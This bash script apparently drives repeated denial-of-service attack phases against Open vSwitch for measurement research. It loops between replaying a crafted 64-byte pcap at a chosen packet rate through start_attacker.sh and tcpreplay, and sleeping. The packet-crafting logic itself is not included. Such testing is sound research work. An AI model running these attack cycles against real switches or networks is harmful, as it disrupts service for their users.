#! /bin/bash

#COLORIZING
none='\033[0m'
bold='\033[01m'
disable='\033[02m'
underline='\033[04m'
reverse='\033[07m'
strikethrough='\033[09m'
invisible='\033[08m'

black='\033[30m'
red='\033[31m'
green='\033[32m'
orange='\033[33m'
blue='\033[34m'
purple='\033[35m'
cyan='\033[36m'
lightgrey='\033[37m'

OVSDOS_TOOLS="/root/ovsdos/tools_for_measurements"
ATTACK_TIME="10"
SLEEP_TIME="3"
ATTACK_RATE="1000"

function show_help
{
  echo -e "${green}Example: ./auto_attacker.sh [-a 10] [-s 3] [-d /root/ovsdos/tools_for_measurements] [-r 1000]${none}"
  echo -e "${orange}\t\t-a <Time in Seconds>: Attack Time${none}${none}"
  echo -e "${orange}\t\t-s <Time in Seconds>: Sleep Time${none}"
  echo -e "${orange}\t\t-d <Path>: OVSDOS Tools Path${none}"
  echo -e "${orange}\t\t-r <Rate in pps>: Attack Rate${none}"

  exit
}

while getopts "h?a:s:d:r:" opt
do
  case "$opt" in
  h|\?)
    show_help
    ;;
  a)
    ATTACK_TIME=$OPTARG
    ;;
  s)
   SLEEP_TIME=$OPTARG
    ;;
  d)
   OVSDOS_TOOLS=$OPTARG
    ;;
  r)
   ATTACK_RATE=$OPTARG
    ;;
  *)
    show_help
   ;;
  esac
done

while true
do
	echo -ne "${red}Attack Phase${none}"
	SECONDS=0
	${OVSDOS_TOOLS}/start_attacker.sh ${ATTACK_RATE} enp1s0f1 ${OVSDOS_TOOLS}/../pcap_gen_ovs_dos/SIP_SP_DP.64bytes.pcap 64 &
	PID=$!
	sleep ${ATTACK_TIME}
	kill -9 $PID
	wait $PID 2>/dev/null
	pkill tcpreplay
	echo -ne "${orange}\t${SECONDS}s${none}"
	echo -e "${green}\t\t[DONE]${none}"
	echo -ne "${blue}Sleep Phase${none}"
	SECONDS=0
	sleep ${SLEEP_TIME}
	echo -ne "${orange}\t${SECONDS}s${none}"
	echo -e "${green}\t\t[DONE]${none}"
done

